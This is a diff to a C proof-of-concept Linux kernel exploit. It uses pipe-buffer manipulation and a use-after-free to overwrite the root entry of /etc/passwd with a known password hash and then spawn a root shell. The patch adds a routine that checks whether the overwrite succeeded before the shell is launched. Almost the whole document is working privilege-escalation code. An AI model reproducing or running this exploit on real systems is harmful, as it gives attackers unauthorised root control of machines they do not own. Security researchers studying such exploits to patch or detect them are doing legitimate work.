@@ -103,9 +103,12 @@ int pipe_fds[PIPES_N][2];
 
 #define PIPE_BUF_FLAG_CAN_MERGE	0x10
 
-/* Write to /etc/passwd after the "root" word at the beginning of the file */
-#define FILE_OFFSET	4
+/* Write to /etc/passwd after the "root:" word at the beginning of the file */
+#define PASSWD_OFFSET	4
 int file_fd = 0;
+
+/* The hash generaged with `openssl passwd -1 -salt root pwn` */
+char *pwd = "$1$root$c1pi5nHqxDexgFYdvJoZB.:0:0:root:/root:/bin/bash\n";
 
 int prepare_pipes(void)
 {
@@ -151,6 +154,72 @@ int prepare_pipes(void)
 	return EXIT_SUCCESS;
 }
 
+#define CHECK_BUF_SZ 256
+
+int check_passwd(void)
+{
+	int check_fd = 0;
+	ssize_t bytes = 0;
+	char check_buf[CHECK_BUF_SZ] = { 0 };
+	size_t pwd_len = strlen(pwd);
+	int ret = 0;
+	int check_result = EXIT_FAILURE;
+
+	/* Be sure that check_buf size is enough for pwd including null byte */
+	if (pwd_len >= CHECK_BUF_SZ) {
+		printf("[-] pwd_len is too big\n");
+		exit(EXIT_FAILURE);
+	}
+
+	check_fd = open("/etc/passwd", O_RDONLY);
+	if (check_fd < 0) {
+		perror("[-] open");
+		return EXIT_FAILURE;
+	}
+
+	assert(PASSWD_OFFSET + 1 < CHECK_BUF_SZ);
+	bytes = read(check_fd, check_buf, PASSWD_OFFSET + 1);
+	if (bytes < 0) {
+		perror("[-] read");
+		goto end;
+	}
+	if (bytes != PASSWD_OFFSET + 1) {
+		printf("[-] read short\n");
+		goto end;
+	}
+
+	ret = strncmp(check_buf, "root:", PASSWD_OFFSET + 1);
+	if (ret != 0) {
+		printf("[+] weird /etc/passwd\n");
+		goto end;
+	}
+
+	bytes = read(check_fd, check_buf, pwd_len);
+	if (bytes < 0) {
+		perror("[-] read");
+		goto end;
+	}
+	if (bytes != pwd_len) {
+		printf("[-] read short\n");
+		goto end;
+	}
+
+	ret = strncmp(check_buf, pwd, pwd_len);
+	if (ret == 0) {
+		printf("[+] /etc/passwd contains the needed data\n");
+		check_result = EXIT_SUCCESS;
+	} else {
+		printf("[+] /etc/passwd contains the wrong data\n");
+	}
+
+end:
+	ret = close(check_fd);
+	if (ret != 0)
+		perror("[-] close check_fd");
+
+	return check_result;
+}
+
 int main(void)
 {
 	int ret = EXIT_FAILURE;
@@ -160,8 +229,6 @@ int main(void)
 	long reserved_from_n = 0;
 	long uaf_n = 0;
 	ssize_t bytes = 0;
-	/* The hash generaged with `openssl passwd -1 -salt root pwn` */
-	char *pwd = "$1$root$c1pi5nHqxDexgFYdvJoZB.:0:0:root:/root:/bin/bash\n";
 	size_t pwd_len = strlen(pwd);
 	char *argv[] = {
 		"/bin/sh",
@@ -258,7 +325,7 @@ int main(void)
 	printf("[!] allocate (objs_per_slab * 2) target objects to create and fill new target slab\n");
 	/* Reallocate the write end of the pipe as object of size (N * sizeof(struct pipe_buffer)) */
 	for (i = 0; i < PIPES_N; i++) {
-		loff_t file_offset = FILE_OFFSET;
+		loff_t file_offset = PASSWD_OFFSET;
 
 		ret = fcntl(pipe_fds[i][1], F_SETPIPE_SZ, PAGE_SIZE * N);
 		if (ret != PAGE_SIZE * N) {
@@ -307,14 +374,17 @@ int main(void)
 		}
 
 	}
-	printf("[+] wrote to pipes, now try to run the root shell\n");
+	printf("[+] wrote to pipes\n");
 
-	execv("/bin/sh", argv); /* This should not return */
-	perror("[-] execv");
+	if (check_passwd() == EXIT_SUCCESS) {
+		printf("[+] /etc/passwd is overwritten, now try to run the root shell\n");
+		execv("/bin/sh", argv); /* This should not return */
+		perror("[-] execv");
+	}
+
+	printf("[-] exploit failed\n");
 
 end:
-	printf("[!] finishing this PoC exploit\n");
-
 	for (i = 0; i < PIPES_N; i++) {
 		if (pipe_fds[i][0] >= 0) {
 			ret = close(pipe_fds[i][0]);
